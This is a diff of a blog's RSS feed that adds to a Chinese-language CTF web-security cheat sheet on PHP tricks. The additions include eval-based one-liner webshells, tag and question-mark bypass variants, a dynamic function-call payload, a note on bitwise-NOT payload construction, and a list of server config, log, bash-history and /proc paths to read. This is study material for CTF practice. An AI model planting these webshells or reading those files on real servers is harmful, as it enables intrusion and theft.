@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Mon, 16 Mar 2020 15:56:47 +0800</lastBuildDate>
+        <lastBuildDate>Mon, 16 Mar 2020 17:30:24 +0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss+xml" href="https://ajatars.github.io/rss.xml" />
         
@@ -95,19 +95,30 @@
 <li><a href="#12-%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D">1.2 变量命名</a></li>
 <li><a href="#13-php%E4%BC%AA%E5%8D%8F%E8%AE%AE">1.3 php伪协议</a></li>
 <li><a href="#14-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">1.4 php反序列化</a></li>
-<li><a href="15-%E7%AA%81%E7%A0%B4disable_functions">1.5 突破disable_functions</a></li>
-<li><a href="16-php%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0">1.6 php一些函数</a></li>
+<li><a href="#15-%E7%AA%81%E7%A0%B4disable_functions">1.5 突破disable_functions</a></li>
+<li><a href="#16-php%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0">1.6 php一些函数</a></li>
+<li><a href="#17php%E4%B8%80%E5%8F%A5%E8%AF%9D">1.7 php一句话</a></li>
+<li><a href="#18php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Cgetshell">1.8 php代码执行getshell</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6">2.关键文件</a>
+<ul>
+<li><a href="#21-nginx">2.1 nginx</a></li>
+<li><a href="#22-apache">2.2 apache</a></li>
+<li><a href="#23-bash">2.3 bash文件</a></li>
 </ul>
 </li>
 </ul>
 </blockquote>
 <h2 id="1php相关">1.PHP相关</h2>
 <h4 id="11-变量覆盖">1.1 变量覆盖</h4>
-<p>变量覆盖通常点有: <strong>extract、$$、parse_str()、import_request_variables()</strong></p>
+<p>变量覆盖通常点有: **extract、$$、parse_str()。</p>
 <p><strong>$$</strong> 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现。</p>
 <p><strong>extract()</strong> 该函数使用数组键名作为变量名，通常结合全局变量: $_GET、$_POST、$_REQUEST。</p>
 <p><strong>parse_str()</strong> 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
-<p><strong>import_request_variables()</strong> 可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p>
+<hr>
+<h4 id="12-变量命名">1.2 变量命名</h4>
+<p>php命名变量可使用大括号包裹</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -115,23 +126,16 @@
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="nx">import_request_variables</span><span class="p">(</span><span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="s2">&#34;get_&#34;</span><span class="p">);</span>
-<span class="k">echo</span> <span class="nv">$get_id</span><span class="p">;</span>
-<span class="cp">?&gt;</span>
-//提交：?id=111
-//结构：111
+<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;this is a&#39;</span><span class="p">;</span>
+<span class="err">$</span><span class="p">{</span><span class="nx">b</span><span class="p">}</span> <span class="o">=</span> <span class="s1">&#39;this is b&#39;</span><span class="p">;</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
 </div><hr>
-<h4 id="12-变量命名">1.2 变量命名</h4>
-<p>php命名变量可使用大括号包裹</p>
-<pre><code>${a} = 'a';
-$
-</code></pre><hr>
 <h4 id="13-php伪协议">1.3 php伪协议</h4>
 <p>php//访问各个输入/输出流（I / O流），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php:/ /input用于执行php代码。</p>
 <p><strong>php://filter</strong>: 常用于读取文件(文件函数可控参数，xxe)、死亡绕过exit(),die()、phar metadate反序列化,当有正则过滤时，可尝试大小写绕过。</p>
@@ -332,7 +336,80 @@ assert(&quot;strpos('$file', '..') === false&quot;);
 <p><code>getimagesize()</code> 可以触发phar 反序列化</p>
 <p><code>get_defined_functions()</code>这个函数是用于返回所有已定义函数的数组
 <code>get_defined_vars() </code>这个函数是返回由所有已定义变量所组成的数组</p>
-<p><code>$_SERVER['REQUEST_URI']</code>以及<code>$_REQUEST</code>会对特殊字符(空格、.、[)转换成为下划线_</p>
+<p><code>$_SERVER['REQUEST_URI']</code>以及<code>$_REQUEST</code>会对特殊字符(<code>空格</code>、<code>.</code>、<code>[</code>)转换成为下划线_</p>
+<hr>
+<h4 id="17-php一句话">1.7 php一句话</h4>
+<p><strong>绕过尖括号</strong></p>
+<p>修改.htaccess或者.user.ini文件，为每个文件包含一个php伪协议</p>
+<p><strong>绕过问号限制</strong></p>
+<p>php小于7.0的可以通过</p>
+<p><code>&lt;script language=&quot;PHP&quot;&gt;eval($_POST[A])&lt;/script&gt;</code></p>
+<p><strong>绕过php标签限制</strong></p>
+<p>短标签</p>
+<p><code>&lt;?=eval($_POST[A]);?&gt;</code></p>
+<p><strong>动态执行函数</strong></p>
+<p><code>$_GET[1]($_GET[0]);</code></p>
+<p><code>$_GET[1] ${$_GET[0]};</code></p>
+<hr>
+<h4 id="18-php代码执行getshell">1.8 php代码执行getshell</h4>
+<p><a href="https://www.jianshu.com/p/9ae0c80751c4">CTF踩坑PHP编写一个不包含数字字母和下划线的后门</a></p>
+<p>异或getshell</p>
+<p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
+<p><a href="https://xz.aliyun.com/t/5677">一道题回顾php异或webshell</a></p>
+<p>取反getsehll</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">print(&#34;和&#34;.encode(&#39;utf8&#39;))
+b&#39;\xe5\x92\x8c&#39;
+print(&#34;和&#34;.encode(&#39;utf8&#39;)[2])
+140
+print(~&#34;和&#34;.encode(&#39;utf8&#39;)[2])
+-141
+</code></pre></td></tr></table>
+</div>
+</div><p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。
+负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<hr>
+<h2 id="2关键文件">2.关键文件</h2>
+<h4 id="21-nginx">2.1 nginx</h4>
+<p>​	nginx配置文件</p>
+<pre><code>/usr/local/nginx/conf/nginx.conf
+/etc/nginx/nginx.conf
+</code></pre><p>​	nginx日志</p>
+<pre><code>/var/log/nginx/access.log
+/var/log/nginx/error.log
+</code></pre><h4 id="22-apache">2.2 apache</h4>
+<pre><code>/etc/apache2/sites-enabled/000-default.conf 查看默认根路径
+/etc/apache2/apache2.conf    ubuntu下主配置文件
+
+日志
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+</code></pre><h4 id="23-bash文件">2.3 bash文件</h4>
+<pre><code>.bash_history 用户使用过的历史命令
+.bashrc 用户定义别名和函数
+.bash_profile  环境变量配置
+.bash_logout 用户登出时执行的命令
+</code></pre><h4 id="24-proc文件">2.4 proc文件</h4>
+<p>linux 万物皆为文件，进程也不例外</p>
+<pre><code>/proc/self 链接到当前正在运行的进程
+
+/proc/N/cwd 链接到进程当前工作目录
+
+如果是通过小马执行的程序，那么当前进程就是apache，组合一下self/cwd:
+proc/self/cwd/     =&gt;apache的工作目录
+
+proc/pid/cmdline   =&gt;里面存储某个进程初始运行的命令,即启动时传递给kernel的参数信息
+</code></pre><p>CTF： <a href="https://blog.csdn.net/qq_38154820/article/details/103308985">2019高校运维赛misc2</a></p>
 ]]></description>
                 
                 
